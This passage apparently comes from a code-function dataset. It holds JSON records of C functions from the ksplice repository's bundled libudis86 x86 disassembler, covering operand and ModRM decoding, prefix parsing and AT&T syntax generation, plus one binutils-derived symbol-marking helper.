u->pc + op->lval.sbyte); \n\t\t\t\tbreak;\n\t\t\tcase 16:\n\t\t\t\tmkasm(u, \"0x\" FMT64 \"x\", u->pc + op->lval.sword);\n\t\t\t\tbreak;\n\t\t\tcase 32:\n\t\t\t\tmkasm(u, \"0x\" FMT64 \"x\", u->pc + op->lval.sdword);\n\t\t\t\tbreak;\n\t\t\tdefault:break;\n\t\t}\n\t\tbreak;\n\n\tcase UD_OP_PTR:\n\t\tswitch (op->size) {\n\t\t\tcase 32:\n\t\t\t\tmkasm(u, \"$0x%x, $0x%x\", op->lval.ptr.seg, \n\t\t\t\t\top->lval.ptr.off & 0xFFFF);\n\t\t\t\tbreak;\n\t\t\tcase 48:\n\t\t\t\tmkasm(u, \"$0x%x, $0x%lx\", op->lval.ptr.seg, \n\t\t\t\t\top->lval.ptr.off);\n\t\t\t\tbreak;\n\t\t}\n\t\tbreak;\n\t\t\t\n\tdefault: return;\n  }\n}", "path": "kmodsrc\\x86\\libudis86\\syn-att.c", "repo_name": "jirislaby/ksplice", "stars": 82, "license": "gpl-2.0", "language": "c", "size": 430}
{"docstring": "/* -----------------------------------------------------------------------------\n * disasm_operands() - Disassembles Operands.\n * -----------------------------------------------------------------------------\n */\n", "func_signal": "static int disasm_operands(register struct ud* u)", "code": "{\n\n\n  /* mopXt = map entry, operand X, type; */\n  enum ud_operand_code mop1t = u->itab_entry->operand1.type;\n  enum ud_operand_code mop2t = u->itab_entry->operand2.type;\n  enum ud_operand_code mop3t = u->itab_entry->operand3.type;\n\n  /* mopXs = map entry, operand X, size */\n  unsigned int mop1s = u->itab_entry->operand1.size;\n  unsigned int mop2s = u->itab_entry->operand2.size;\n  unsigned int mop3s = u->itab_entry->operand3.size;\n\n  /* iop = instruction operand */\n  register struct ud_operand* iop = u->operand;\n    \n  switch(mop1t) {\n    \n    case OP_A :\n        decode_a(u, &(iop[0]));\n        break;\n    \n    /* M[b] ... */\n    case OP_M :\n        if (MODRM_MOD(inp_peek(u)) == 3)\n            u->error= 1;\n    /* E, G/P/V/I/CL/1/S */\n    case OP_E :\n        if (mop2t == OP_G) {\n            decode_modrm(u, &(iop[0]), mop1s, T_GPR, &(iop[1]), mop2s, T_GPR);\n            if (mop3t == OP_I)\n                decode_imm(u, mop3s, &(iop[2]));\n            else if (mop3t == OP_CL) {\n                iop[2].type = UD_OP_REG;\n                iop[2].base = UD_R_CL;\n                iop[2].size = 8;\n            }\n        }\n        else if (mop2t == OP_P)\n            decode_modrm(u, &(iop[0]), mop1s, T_GPR, &(iop[1]), mop2s, T_MMX);\n        else if (mop2t == OP_V)\n            decode_modrm(u, &(iop[0]), mop1s, T_GPR, &(iop[1]), mop2s, T_XMM);\n        else if (mop2t == OP_S)\n            decode_modrm(u, &(iop[0]), mop1s, T_GPR, &(iop[1]), mop2s, T_SEG);\n        else {\n            decode_modrm(u, &(iop[0]), mop1s, T_GPR, NULL, 0, T_NONE);\n            if (mop2t == OP_CL) {\n                iop[1].type = UD_OP_REG;\n                iop[1].base = UD_R_CL;\n                iop[1].size = 8;\n            } else if (mop2t == OP_I1) {\n                iop[1].type = UD_OP_CONST;\n                u->operand[1].lval.udword = 1;\n            } else if (mop2t == OP_I) {\n                decode_imm(u, mop2s, &(iop[1]));\n            }\n        }\n        break;\n\n    /* G, E/PR[,I]/VR */\n    case OP_G :\n        if (mop2t == OP_M) {\n            if (MODRM_MOD(inp_peek(u)) == 3)\n                u->error= 1;\n            decode_modrm(u, &(iop[1]), mop2s, T_GPR, &(iop[0]), mop1s, T_GPR);\n        } else if (mop2t == OP_E) {\n            decode_modrm(u, &(iop[1]), mop2s, T_GPR, &(iop[0]), mop1s, T_GPR);\n            if (mop3t == OP_I)\n                decode_imm(u, mop3s, &(iop[2]));\n        } else if (mop2t == OP_PR) {\n            decode_modrm(u, &(iop[1]), mop2s, T_MMX, &(iop[0]), mop1s, T_GPR);\n            if (mop3t == OP_I)\n                decode_imm(u, mop3s, &(iop[2]));\n        } else if (mop2t == OP_VR) {\n            if (MODRM_MOD(inp_peek(u)) != 3)\n                u->error = 1;\n            decode_modrm(u, &(iop[1]), mop2s, T_XMM, &(iop[0]), mop1s, T_GPR);\n        } else if (mop2t == OP_W)\n            decode_modrm(u, &(iop[1]), mop2s, T_XMM, &(iop[0]), mop1s, T_GPR);\n        break;\n\n    /* AL..BH, I/O/DX */\n    case OP_AL : case OP_CL : case OP_DL : case OP_BL :\n    case OP_AH : case OP_CH : case OP_DH : case OP_BH :\n\n        iop[0].type = UD_OP_REG;\n        iop[0].base = UD_R_AL + (mop1t - OP_AL);\n        iop[0].size = 8;\n\n        if (mop2t == OP_I)\n            decode_imm(u, mop2s, &(iop[1]));\n        else if (mop2t == OP_DX) {\n            iop[1].type = UD_OP_REG;\n            iop[1].base = UD_R_DX;\n            iop[1].size = 16;\n        }\n        else if (mop2t == OP_O)\n            decode_o(u, mop2s, &(iop[1]));\n        break;\n\n    /* rAX[r8]..rDI[r15], I/rAX..rDI/O */\n    case OP_rAXr8 : case OP_rCXr9 : case OP_rDXr10 : case OP_rBXr11 :\n    case OP_rSPr12: case OP_rBPr13: case OP_rSIr14 : case OP_rDIr15 :\n    case OP_rAX : case OP_rCX : case OP_rDX : case OP_rBX :\n    case OP_rSP : case OP_rBP : case OP_rSI : case OP_rDI :\n\n        iop[0].type = UD_OP_REG;\n        iop[0].base = resolve_gpr64(u, mop1t);\n\n        if (mop2t == OP_I)\n            decode_imm(u, mop2s, &(iop[1]));\n        else if (mop2t >= OP_rAX && mop2t <= OP_rDI) {\n            iop[1].type = UD_OP_REG;\n            iop[1].base = resolve_gpr64(u, mop2t);\n        }\n        else if (mop2t == OP_O) {\n            decode_o(u, mop2s, &(iop[1]));  \n            iop[0].size = resolve_operand_size(u, mop2s);\n        }\n        break;\n\n    /* AL[r8b]..BH[r15b], I */\n    case OP_ALr8b : case OP_CLr9b : case OP_DLr10b : case OP_BLr11b :\n    case OP_AHr12b: case OP_CHr13b: case OP_DHr14b : case OP_BHr15b :\n    {\n        ud_type_t gpr = (mop1t - OP_ALr8b) + UD_R_AL + \n                        (REX_B(u->pfx_rex) << 3);\n        if (UD_R_AH <= gpr && u->pfx_rex)\n            gpr = gpr + 4;\n        iop[0].type = UD_OP_REG;\n        iop[0].base = gpr;\n        if (mop2t == OP_I)\n            decode_imm(u, mop2s, &(iop[1]));\n        break;\n    }\n\n    /* eAX..eDX, DX/I */\n    case OP_eAX : case OP_eCX : case OP_eDX : case OP_eBX :\n    case OP_eSP : case OP_eBP : case OP_eSI : case OP_eDI :\n        iop[0].type = UD_OP_REG;\n        iop[0].base = resolve_gpr32(u, mop1t);\n        if (mop2t == OP_DX) {\n            iop[1].type = UD_OP_REG;\n            iop[1].base = UD_R_DX;\n            iop[1].size = 16;\n        } else if (mop2t == OP_I)\n            decode_imm(u, mop2s, &(iop[1]));\n        break;\n\n    /* ES..GS */\n    case OP_ES : case OP_CS : case OP_DS :\n    case OP_SS : case OP_FS : case OP_GS :\n\n        /* in 64bits mode, only fs and gs are allowed */\n        if (u->dis_mode == 64)\n            if (mop1t != OP_FS && mop1t != OP_GS)\n                u->error= 1;\n        iop[0].type = UD_OP_REG;\n        iop[0].base = (mop1t - OP_ES) + UD_R_ES;\n        iop[0].size = 16;\n\n        break;\n\n    /* J */\n    case OP_J :\n        decode_imm(u, mop1s, &(iop[0]));        \n        iop[0].type = UD_OP_JIMM;\n        break ;\n\n    /* PR, I */\n    case OP_PR:\n        if (MODRM_MOD(inp_peek(u)) != 3)\n            u->error = 1;\n        decode_modrm(u, &(iop[0]), mop1s, T_MMX, NULL, 0, T_NONE);\n        if (mop2t == OP_I)\n            decode_imm(u, mop2s, &(iop[1]));\n        break; \n\n    /* VR, I */\n    case OP_VR:\n        if (MODRM_MOD(inp_peek(u)) != 3)\n            u->error = 1;\n        decode_modrm(u, &(iop[0]), mop1s, T_XMM, NULL, 0, T_NONE);\n        if (mop2t == OP_I)\n            decode_imm(u, mop2s, &(iop[1]));\n        break; \n\n    /* P, Q[,I]/W/E[,I],VR */\n    case OP_P :\n        if (mop2t == OP_Q) {\n            decode_modrm(u, &(iop[1]), mop2s, T_MMX, &(iop[0]), mop1s, T_MMX);\n            if (mop3t == OP_I)\n                decode_imm(u, mop3s, &(iop[2]));\n        } else if (mop2t == OP_W) {\n            decode_modrm(u, &(iop[1]), mop2s, T_XMM, &(iop[0]), mop1s, T_MMX);\n        } else if (mop2t == OP_VR) {\n            if (MODRM_MOD(inp_peek(u)) != 3)\n                u->error = 1;\n            decode_modrm(u, &(iop[1]), mop2s, T_XMM, &(iop[0]), mop1s, T_MMX);\n        } else if (mop2t == OP_E) {\n            decode_modrm(u, &(iop[1]), mop2s, T_GPR, &(iop[0]), mop1s, T_MMX);\n            if (mop3t == OP_I)\n                decode_imm(u, mop3s, &(iop[2]));\n        }\n        break;\n\n    /* R, C/D */\n    case OP_R :\n        if (mop2t == OP_C)\n            decode_modrm(u, &(iop[0]), mop1s, T_GPR, &(iop[1]), mop2s, T_CRG);\n        else if (mop2t == OP_D)\n            decode_modrm(u, &(iop[0]), mop1s, T_GPR, &(iop[1]), mop2s, T_DBG);\n        break;\n\n    /* C, R */\n    case OP_C :\n        decode_modrm(u, &(iop[1]), mop2s, T_GPR, &(iop[0]), mop1s, T_CRG);\n        break;\n\n    /* D, R */\n    case OP_D :\n        decode_modrm(u, &(iop[1]), mop2s, T_GPR, &(iop[0]), mop1s, T_DBG);\n        break;\n\n    /* Q, P */\n    case OP_Q :\n        decode_modrm(u, &(iop[0]), mop1s, T_MMX, &(iop[1]), mop2s, T_MMX);\n        break;\n\n    /* S, E */\n    case OP_S :\n        decode_modrm(u, &(iop[1]), mop2s, T_GPR, &(iop[0]), mop1s, T_SEG);\n        break;\n\n    /* W, V */\n    case OP_W :\n        decode_modrm(u, &(iop[0]), mop1s, T_XMM, &(iop[1]), mop2s, T_XMM);\n        break;\n\n    /* V, W[,I]/Q/M/E */\n    case OP_V :\n        if (mop2t == OP_W) {\n            /* special cases for movlps and movhps */\n            if (MODRM_MOD(inp_peek(u)) == 3) {\n                if (u->mnemonic == UD_Imovlps)\n                    u->mnemonic = UD_Imovhlps;\n                else\n                if (u->mnemonic == UD_Imovhps)\n                    u->mnemonic = UD_Imovlhps;\n            }\n            decode_modrm(u, &(iop[1]), mop2s, T_XMM, &(iop[0]), mop1s, T_XMM);\n            if (mop3t == OP_I)\n                decode_imm(u, mop3s, &(iop[2]));\n        } else if (mop2t == OP_Q)\n            decode_modrm(u, &(iop[1]), mop2s, T_MMX, &(iop[0]), mop1s, T_XMM);\n        else if (mop2t == OP_M) {\n            if (MODRM_MOD(inp_peek(u)) == 3)\n                u->error= 1;\n            decode_modrm(u, &(iop[1]), mop2s, T_GPR, &(iop[0]), mop1s, T_XMM);\n        } else if (mop2t == OP_E) {\n            decode_modrm(u, &(iop[1]), mop2s, T_GPR, &(iop[0]), mop1s, T_XMM);\n        } else if (mop2t == OP_PR) {\n            decode_modrm(u, &(iop[1]), mop2s, T_MMX, &(iop[0]), mop1s, T_XMM);\n        }\n        break;\n\n    /* DX, eAX/AL */\n    case OP_DX :\n        iop[0].type = UD_OP_REG;\n        iop[0].base = UD_R_DX;\n        iop[0].size = 16;\n\n        if (mop2t == OP_eAX) {\n            iop[1].type = UD_OP_REG;    \n            iop[1].base = resolve_gpr32(u, mop2t);\n        } else if (mop2t == OP_AL) {\n            iop[1].type = UD_OP_REG;\n            iop[1].base = UD_R_AL;\n            iop[1].size = 8;\n        }\n\n        break;\n\n    /* I, I/AL/eAX */\n    case OP_I :\n        decode_imm(u, mop1s, &(iop[0]));\n        if (mop2t == OP_I)\n            decode_imm(u, mop2s, &(iop[1]));\n        else if (mop2t == OP_AL) {\n            iop[1].type = UD_OP_REG;\n            iop[1].base = UD_R_AL;\n            iop[1].size = 16;\n        } else if (mop2t == OP_eAX) {\n            iop[1].type = UD_OP_REG;    \n            iop[1].base = resolve_gpr32(u, mop2t);\n        }\n        break;\n\n    /* O, AL/eAX */\n    case OP_O :\n        decode_o(u, mop1s, &(iop[0]));\n        iop[1].type = UD_OP_REG;\n        iop[1].size = resolve_operand_size(u, mop1s);\n        if (mop2t == OP_AL)\n            iop[1].base = UD_R_AL;\n        else if (mop2t == OP_eAX)\n            iop[1].base = resolve_gpr32(u, mop2t);\n        else if (mop2t == OP_rAX)\n            iop[1].base = resolve_gpr64(u, mop2t);      \n        break;\n\n    /* 3 */\n    case OP_I3 :\n        iop[0].type = UD_OP_CONST;\n        iop[0].lval.sbyte = 3;\n        break;\n\n    /* ST(n), ST(n) */\n    case OP_ST0 : case OP_ST1 : case OP_ST2 : case OP_ST3 :\n    case OP_ST4 : case OP_ST5 : case OP_ST6 : case OP_ST7 :\n\n        iop[0].type = UD_OP_REG;\n        iop[0].base = (mop1t-OP_ST0) + UD_R_ST0;\n        iop[0].size = 0;\n\n        if (mop2t >= OP_ST0 && mop2t <= OP_ST7) {\n            iop[1].type = UD_OP_REG;\n            iop[1].base = (mop2t-OP_ST0) + UD_R_ST0;\n            iop[1].size = 0;\n        }\n        break;\n\n    /* AX */\n    case OP_AX:\n        iop[0].type = UD_OP_REG;\n        iop[0].base = UD_R_AX;\n        iop[0].size = 16;\n        break;\n\n    /* none */\n    default :\n        iop[0].type = iop[1].type = iop[2].type = UD_NONE;\n  }\n\n  return 0;\n}", "path": "kmodsrc\\x86\\libudis86\\decode.c", "repo_name": "jirislaby/ksplice", "stars": 82, "license": "gpl-2.0", "language": "c", "size": 430}
{"docstring": "/* -----------------------------------------------------------------------------\n * resolve_gpr32 () - 32bit General Purpose Register-Selection. \n * -----------------------------------------------------------------------------\n */\n", "func_signal": "static enum ud_type \nresolve_gpr32(struct ud* u, enum ud_operand_code gpr_op)", "code": "{\n  gpr_op = gpr_op - OP_eAX;\n\n  if (u->opr_mode == 16) \n    return gpr_op + UD_R_AX;\n\n  return gpr_op +  UD_R_EAX;\n}", "path": "kmodsrc\\x86\\libudis86\\decode.c", "repo_name": "jirislaby/ksplice", "stars": 82, "license": "gpl-2.0", "language": "c", "size": 430}
{"docstring": "/* =============================================================================\n * translates to AT&T syntax \n * =============================================================================\n */\n", "func_signal": "extern void \nud_translate_att(struct ud *u)", "code": "{\n  int size = 0;\n\n  /* check if P_OSO prefix is used */\n  if (! P_OSO(u->itab_entry->prefix) && u->pfx_opr) {\n\tswitch (u->dis_mode) {\n\t\tcase 16: \n\t\t\tmkasm(u, \"o32 \");\n\t\t\tbreak;\n\t\tcase 32:\n\t\tcase 64:\n \t\t\tmkasm(u, \"o16 \");\n\t\t\tbreak;\n\t}\n  }\n\n  /* check if P_ASO prefix was used */\n  if (! P_ASO(u->itab_entry->prefix) && u->pfx_adr) {\n\tswitch (u->dis_mode) {\n\t\tcase 16: \n\t\t\tmkasm(u, \"a32 \");\n\t\t\tbreak;\n\t\tcase 32:\n \t\t\tmkasm(u, \"a16 \");\n\t\t\tbreak;\n\t\tcase 64:\n \t\t\tmkasm(u, \"a32 \");\n\t\t\tbreak;\n\t}\n  }\n\n  if (u->pfx_lock)\n  \tmkasm(u,  \"lock \");\n  if (u->pfx_rep)\n\tmkasm(u,  \"rep \");\n  if (u->pfx_repne)\n\t\tmkasm(u,  \"repne \");\n\n  /* special instructions */\n  switch (u->mnemonic) {\n\tcase UD_Iretf: \n\t\tmkasm(u, \"lret \"); \n\t\tbreak;\n\tcase UD_Idb:\n\t\tmkasm(u, \".byte 0x%x\", u->operand[0].lval.ubyte);\n\t\treturn;\n\tcase UD_Ijmp:\n\tcase UD_Icall:\n\t\tif (u->br_far) mkasm(u,  \"l\");\n\t\tmkasm(u, \"%s\", ud_lookup_mnemonic(u->mnemonic));\n\t\tbreak;\n\tcase UD_Ibound:\n\tcase UD_Ienter:\n\t\tif (u->operand[0].type != UD_NONE)\n\t\t\tgen_operand(u, &u->operand[0]);\n\t\tif (u->operand[1].type != UD_NONE) {\n\t\t\tmkasm(u, \",\");\n\t\t\tgen_operand(u, &u->operand[1]);\n\t\t}\n\t\treturn;\n\tdefault:\n\t\tmkasm(u, \"%s\", ud_lookup_mnemonic(u->mnemonic));\n  }\n\n  if (u->c1)\n\tsize = u->operand[0].size;\n  else if (u->c2)\n\tsize = u->operand[1].size;\n  else if (u->c3)\n\tsize = u->operand[2].size;\n\n  if (size == 8)\n\tmkasm(u, \"b\");\n  else if (size == 16)\n\tmkasm(u, \"w\");\n  else if (size == 64)\n \tmkasm(u, \"q\");\n\n  mkasm(u, \" \");\n\n  if (u->operand[2].type != UD_NONE) {\n\tgen_operand(u, &u->operand[2]);\n\tmkasm(u, \", \");\n  }\n\n  if (u->operand[1].type != UD_NONE) {\n\tgen_operand(u, &u->operand[1]);\n\tmkasm(u, \", \");\n  }\n\n  if (u->operand[0].type != UD_NONE)\n\tgen_operand(u, &u->operand[0]);\n}", "path": "kmodsrc\\x86\\libudis86\\syn-att.c", "repo_name": "jirislaby/ksplice", "stars": 82, "license": "gpl-2.0", "language": "c", "size": 430}
{"docstring": "/* =============================================================================\n * ud_init() - Initializes ud_t object.\n * =============================================================================\n */\n", "func_signal": "extern void \nud_init(struct ud* u)", "code": "{\n  memset((void*)u, 0, sizeof(struct ud));\n  ud_set_mode(u, 16);\n  u->mnemonic = UD_Iinvalid;\n  ud_set_pc(u, 0);\n#ifndef __UD_STANDALONE__\n  ud_set_input_file(u, stdin);\n#endif /* __UD_STANDALONE__ */\n}", "path": "kmodsrc\\x86\\libudis86\\udis86.c", "repo_name": "jirislaby/ksplice", "stars": 82, "license": "gpl-2.0", "language": "c", "size": 430}
{"docstring": "/* Modified function from GNU Binutils objcopy.c\n *\n * Mark all the symbols which will be used in output relocations with\n * the BSF_KEEP flag so that those symbols will not be stripped.\n *\n * Ignore relocations which will not appear in the output file.\n */\n", "func_signal": "void mark_symbols_used_in_relocations(bfd *abfd, asection *isection,\n\t\t\t\t      void *ignored)", "code": "{\n\tstruct superbfd *sbfd = fetch_superbfd(abfd);\n\tif (isection->output_section == NULL)\n\t\treturn;\n\n\tstruct supersect *ss = fetch_supersect(sbfd, isection);\n\tss_mark_symbols_used_in_relocations(ss);\n}", "path": "objmanip.c", "repo_name": "jirislaby/ksplice", "stars": 82, "license": "gpl-2.0", "language": "c", "size": 430}
{"docstring": "/* -----------------------------------------------------------------------------\n * resolve_reg() - Resolves the register type \n * -----------------------------------------------------------------------------\n */\n", "func_signal": "static enum ud_type \nresolve_reg(struct ud* u, unsigned int type, unsigned char i)", "code": "{\n  switch (type) {\n    case T_MMX :    return UD_R_MM0  + (i & 7);\n    case T_XMM :    return UD_R_XMM0 + i;\n    case T_CRG :    return UD_R_CR0  + i;\n    case T_DBG :    return UD_R_DR0  + i;\n    case T_SEG :    return UD_R_ES   + (i & 7);\n    case T_NONE:\n    default:    return UD_NONE;\n  }\n}", "path": "kmodsrc\\x86\\libudis86\\decode.c", "repo_name": "jirislaby/ksplice", "stars": 82, "license": "gpl-2.0", "language": "c", "size": 430}
{"docstring": "/* =============================================================================\n * ud_disassemble() - disassembles one instruction and returns the number of \n * bytes disassembled. A zero means end of disassembly.\n * =============================================================================\n */\n", "func_signal": "extern unsigned int\nud_disassemble(struct ud* u)", "code": "{\n  if (ud_input_end(u))\n\treturn 0;\n\n \n  u->insn_buffer[0] = u->insn_hexcode[0] = 0;\n\n \n  if (ud_decode(u) == 0)\n\treturn 0;\n  if (u->translator)\n\tu->translator(u);\n  return ud_insn_len(u);\n}", "path": "kmodsrc\\x86\\libudis86\\udis86.c", "repo_name": "jirislaby/ksplice", "stars": 82, "license": "gpl-2.0", "language": "c", "size": 430}
{"docstring": "/* -----------------------------------------------------------------------------\n * resolve_gpr64() - 64bit General Purpose Register-Selection. \n * -----------------------------------------------------------------------------\n */\n", "func_signal": "static enum ud_type \nresolve_gpr64(struct ud* u, enum ud_operand_code gpr_op)", "code": "{\n  if (gpr_op >= OP_rAXr8 && gpr_op <= OP_rDIr15)\n    gpr_op = (gpr_op - OP_rAXr8) | (REX_B(u->pfx_rex) << 3);          \n  else  gpr_op = (gpr_op - OP_rAX);\n\n  if (u->opr_mode == 16)\n    return gpr_op + UD_R_AX;\n  if (u->dis_mode == 32 || \n    (u->opr_mode == 32 && ! (REX_W(u->pfx_rex) || u->default64))) {\n    return gpr_op + UD_R_EAX;\n  }\n\n  return gpr_op + UD_R_RAX;\n}", "path": "kmodsrc\\x86\\libudis86\\decode.c", "repo_name": "jirislaby/ksplice", "stars": 82, "license": "gpl-2.0", "language": "c", "size": 430}
{"docstring": "/* -----------------------------------------------------------------------------\n * decode_modrm() - Decodes ModRM Byte\n * -----------------------------------------------------------------------------\n */\n", "func_signal": "static void \ndecode_modrm(struct ud* u, struct ud_operand *op, unsigned int s, \n         unsigned char rm_type, struct ud_operand *opreg, \n         unsigned char reg_size, unsigned char reg_type)", "code": "{\n  unsigned char mod, rm, reg;\n\n  inp_next(u);\n\n  /* get mod, r/m and reg fields */\n  mod = MODRM_MOD(inp_curr(u));\n  rm  = (REX_B(u->pfx_rex) << 3) | MODRM_RM(inp_curr(u));\n  reg = (REX_R(u->pfx_rex) << 3) | MODRM_REG(inp_curr(u));\n\n  op->size = resolve_operand_size(u, s);\n\n  /* if mod is 11b, then the UD_R_m specifies a gpr/mmx/sse/control/debug */\n  if (mod == 3) {\n    op->type = UD_OP_REG;\n    if (rm_type ==  T_GPR)\n        op->base = decode_gpr(u, op->size, rm);\n    else    op->base = resolve_reg(u, rm_type, (REX_B(u->pfx_rex) << 3) | (rm&7));\n  } \n  /* else its memory addressing */  \n  else {\n    op->type = UD_OP_MEM;\n\n    /* 64bit addressing */\n    if (u->adr_mode == 64) {\n\n        op->base = UD_R_RAX + rm;\n\n        /* get offset type */\n        if (mod == 1)\n            op->offset = 8;\n        else if (mod == 2)\n            op->offset = 32;\n        else if (mod == 0 && (rm & 7) == 5) {           \n            op->base = UD_R_RIP;\n            op->offset = 32;\n        } else  op->offset = 0;\n\n        /* Scale-Index-Base (SIB) */\n        if ((rm & 7) == 4) {\n            inp_next(u);\n            \n            op->scale = (1 << SIB_S(inp_curr(u))) & ~1;\n            op->index = UD_R_RAX + (SIB_I(inp_curr(u)) | (REX_X(u->pfx_rex) << 3));\n            op->base  = UD_R_RAX + (SIB_B(inp_curr(u)) | (REX_B(u->pfx_rex) << 3));\n\n            /* special conditions for base reference */\n            if (op->index == UD_R_RSP) {\n                op->index = UD_NONE;\n                op->scale = UD_NONE;\n            }\n\n            if (op->base == UD_R_RBP || op->base == UD_R_R13) {\n                if (mod == 0) \n                    op->base = UD_NONE;\n                if (mod == 1)\n                    op->offset = 8;\n                else op->offset = 32;\n            }\n        }\n    } \n\n    /* 32-Bit addressing mode */\n    else if (u->adr_mode == 32) {\n\n        /* get base */\n        op->base = UD_R_EAX + rm;\n\n        /* get offset type */\n        if (mod == 1)\n            op->offset = 8;\n        else if (mod == 2)\n            op->offset = 32;\n        else if (mod == 0 && rm == 5) {\n            op->base = UD_NONE;\n            op->offset = 32;\n        } else  op->offset = 0;\n\n        /* Scale-Index-Base (SIB) */\n        if ((rm & 7) == 4) {\n            inp_next(u);\n\n            op->scale = (1 << SIB_S(inp_curr(u))) & ~1;\n            op->index = UD_R_EAX + (SIB_I(inp_curr(u)) | (REX_X(u->pfx_rex) << 3));\n            op->base  = UD_R_EAX + (SIB_B(inp_curr(u)) | (REX_B(u->pfx_rex) << 3));\n\n            if (op->index == UD_R_ESP) {\n                op->index = UD_NONE;\n                op->scale = UD_NONE;\n            }\n\n            /* special condition for base reference */\n            if (op->base == UD_R_EBP) {\n                if (mod == 0)\n                    op->base = UD_NONE;\n                if (mod == 1)\n                    op->offset = 8;\n                else op->offset = 32;\n            }\n        }\n    } \n\n    /* 16bit addressing mode */\n    else  {\n        switch (rm) {\n            case 0: op->base = UD_R_BX; op->index = UD_R_SI; break;\n            case 1: op->base = UD_R_BX; op->index = UD_R_DI; break;\n            case 2: op->base = UD_R_BP; op->index = UD_R_SI; break;\n            case 3: op->base = UD_R_BP; op->index = UD_R_DI; break;\n            case 4: op->base = UD_R_SI; break;\n            case 5: op->base = UD_R_DI; break;\n            case 6: op->base = UD_R_BP; break;\n            case 7: op->base = UD_R_BX; break;\n        }\n\n        if (mod == 0 && rm == 6) {\n            op->offset= 16;\n            op->base = UD_NONE;\n        }\n        else if (mod == 1)\n            op->offset = 8;\n        else if (mod == 2) \n            op->offset = 16;\n    }\n  }  \n\n  /* extract offset, if any */\n  switch(op->offset) {\n    case 8 : op->lval.ubyte  = inp_uint8(u);  break;\n    case 16: op->lval.uword  = inp_uint16(u);  break;\n    case 32: op->lval.udword = inp_uint32(u); break;\n    case 64: op->lval.uqword = inp_uint64(u); break;\n    default: break;\n  }\n\n  /* resolve register encoded in reg field */\n  if (opreg) {\n    opreg->type = UD_OP_REG;\n    opreg->size = resolve_operand_size(u, reg_size);\n    if (reg_type == T_GPR) \n        opreg->base = decode_gpr(u, opreg->size, reg);\n    else opreg->base = resolve_reg(u, reg_type, reg);\n  }\n}", "path": "kmodsrc\\x86\\libudis86\\decode.c", "repo_name": "jirislaby/ksplice", "stars": 82, "license": "gpl-2.0", "language": "c", "size": 430}
{"docstring": "/* =============================================================================\n * ud_decode() - Instruction decoder. Returns the number of bytes decoded.\n * =============================================================================\n */\n", "func_signal": "unsigned int ud_decode( struct ud* u )", "code": "{\n  inp_start(u);\n\n  if ( clear_insn( u ) ) {\n    ; /* error */\n  } else if ( get_prefixes( u ) != 0 ) {\n    ; /* error */\n  } else if ( search_itab( u ) != 0 ) {\n    ; /* error */\n  } else if ( do_mode( u ) != 0 ) {\n    ; /* error */\n  } else if ( disasm_operands( u ) != 0 ) {\n    ; /* error */\n  } else if ( resolve_mnemonic( u ) != 0 ) {\n    ; /* error */\n  }\n\n  /* Handle decode error. */\n  if ( u->error ) {\n    /* clear out the decode data. */\n    clear_insn( u );\n    /* mark the sequence of bytes as invalid. */\n    u->itab_entry = & ie_invalid;\n    u->mnemonic = u->itab_entry->mnemonic;\n  } \n\n  u->insn_offset = u->pc; /* set offset of instruction */\n  u->insn_fill = 0;   /* set translation buffer index to 0 */\n  u->pc += u->inp_ctr;    /* move program counter by bytes decoded */\n  gen_hex( u );       /* generate hex code */\n\n  /* return number of bytes disassembled. */\n  return u->inp_ctr;\n}", "path": "kmodsrc\\x86\\libudis86\\decode.c", "repo_name": "jirislaby/ksplice", "stars": 82, "license": "gpl-2.0", "language": "c", "size": 430}
{"docstring": "/* Extracts instruction prefixes.\n */\n", "func_signal": "static int get_prefixes( struct ud* u )", "code": "{\n    unsigned int have_pfx = 1;\n    unsigned int i;\n    uint8_t curr;\n\n    /* if in error state, bail out */\n    if ( u->error ) \n        return -1; \n\n    /* keep going as long as there are prefixes available */\n    for ( i = 0; have_pfx ; ++i ) {\n\n        /* Get next byte. */\n        inp_next(u); \n        if ( u->error ) \n            return -1;\n        curr = inp_curr( u );\n\n        /* rex prefixes in 64bit mode */\n        if ( u->dis_mode == 64 && ( curr & 0xF0 ) == 0x40 ) {\n            u->pfx_rex = curr;  \n        } else {\n            switch ( curr )  \n            {\n            case 0x2E : \n                u->pfx_seg = UD_R_CS; \n                u->pfx_rex = 0;\n                break;\n            case 0x36 :     \n                u->pfx_seg = UD_R_SS; \n                u->pfx_rex = 0;\n                break;\n            case 0x3E : \n                u->pfx_seg = UD_R_DS; \n                u->pfx_rex = 0;\n                break;\n            case 0x26 : \n                u->pfx_seg = UD_R_ES; \n                u->pfx_rex = 0;\n                break;\n            case 0x64 : \n                u->pfx_seg = UD_R_FS; \n                u->pfx_rex = 0;\n                break;\n            case 0x65 : \n                u->pfx_seg = UD_R_GS; \n                u->pfx_rex = 0;\n                break;\n            case 0x67 : /* adress-size override prefix */ \n                u->pfx_adr = 0x67;\n                u->pfx_rex = 0;\n                break;\n            case 0xF0 : \n                u->pfx_lock = 0xF0;\n                u->pfx_rex  = 0;\n                break;\n            case 0x66: \n                /* the 0x66 sse prefix is only effective if no other sse prefix\n                 * has already been specified.\n                 */\n                if ( !u->pfx_insn ) u->pfx_insn = 0x66;\n                u->pfx_opr = 0x66;           \n                u->pfx_rex = 0;\n                break;\n            case 0xF2:\n                u->pfx_insn  = 0xF2;\n                u->pfx_repne = 0xF2; \n                u->pfx_rex   = 0;\n                break;\n            case 0xF3:\n                u->pfx_insn = 0xF3;\n                u->pfx_rep  = 0xF3; \n                u->pfx_repe = 0xF3; \n                u->pfx_rex  = 0;\n                break;\n            default : \n                /* No more prefixes */\n                have_pfx = 0;\n                break;\n            }\n        }\n\n        /* check if we reached max instruction length */\n        if ( i + 1 == MAX_INSN_LENGTH ) {\n            u->error = 1;\n            break;\n        }\n    }\n\n    /* return status */\n    if ( u->error ) \n        return -1; \n\n    /* rewind back one byte in stream, since the above loop \n     * stops with a non-prefix byte. \n     */\n    inp_back(u);\n\n    /* speculatively determine the effective operand mode,\n     * based on the prefixes and the current disassembly\n     * mode. This may be inaccurate, but useful for mode\n     * dependent decoding.\n     */\n    if ( u->dis_mode == 64 ) {\n        u->opr_mode = REX_W( u->pfx_rex ) ? 64 : ( ( u->pfx_opr ) ? 16 : 32 ) ;\n        u->adr_mode = ( u->pfx_adr ) ? 32 : 64;\n    } else if ( u->dis_mode == 32 ) {\n        u->opr_mode = ( u->pfx_opr ) ? 16 : 32;\n        u->adr_mode = ( u->pfx_adr ) ? 16 : 32;\n    } else if ( u->dis_mode == 16 ) {\n        u->opr_mode = ( u->pfx_opr ) ? 32 : 16;\n        u->adr_mode = ( u->pfx_adr ) ? 32 : 16;\n    }\n\n    return 0;\n}", "path": "kmodsrc\\x86\\libudis86\\decode.c", "repo_name": "jirislaby/ksplice", "stars": 